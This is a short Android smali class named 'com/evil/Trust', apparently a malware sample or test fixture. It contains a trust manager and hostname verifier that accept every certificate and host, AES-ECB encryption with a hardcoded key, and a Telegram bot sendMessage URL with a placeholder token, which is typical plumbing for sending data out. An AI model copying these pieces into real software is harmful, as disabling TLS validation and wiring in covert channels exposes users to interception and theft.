.class public Lcom/evil/Trust;
.super Ljava/lang/Object;
.implements Ljavax/net/ssl/X509TrustManager;
.implements Ljavax/net/ssl/HostnameVerifier;

.method public checkClientTrusted([Ljava/security/cert/X509Certificate;Ljava/lang/String;)V
    .registers 3
    return-void
.end method

.method public checkServerTrusted([Ljava/security/cert/X509Certificate;Ljava/lang/String;)V
    .registers 3
    return-void
.end method

.method public getAcceptedIssuers()[Ljava/security/cert/X509Certificate;
    .registers 2
    const/4 v0, 0x0
    new-array v0, v0, [Ljava/security/cert/X509Certificate;
    return-object v0
.end method

.method public verify(Ljava/lang/String;Ljavax/net/ssl/SSLSession;)Z
    .registers 4
    const/4 v0, 0x1
    return v0
.end method

.method public static crypt([B)[B
    .registers 5
    const-string v0, "SuperSecretKey16"
    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B
    move-result-object v0
    new-instance v1, Ljavax/crypto/spec/SecretKeySpec;
    const-string v2, "AES"
    invoke-direct {v1, v0, v2}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V
    const-string v2, "AES/ECB/PKCS5Padding"
    invoke-static {v2}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;
    move-result-object v3
    const/4 v2, 0x1
    invoke-virtual {v3, v2, v1}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V
    invoke-virtual {v3, p0}, Ljavax/crypto/Cipher;->doFinal([B)[B
    move-result-object v0
    return-object v0
.end method

.method public static tg()Ljava/lang/String;
    .registers 1
    const-string v0, "https://api.telegram.org/bot1234567890:AAFakeTokenForTestingOnly_abcdefghi/sendMessage"
    return-object v0
.end method
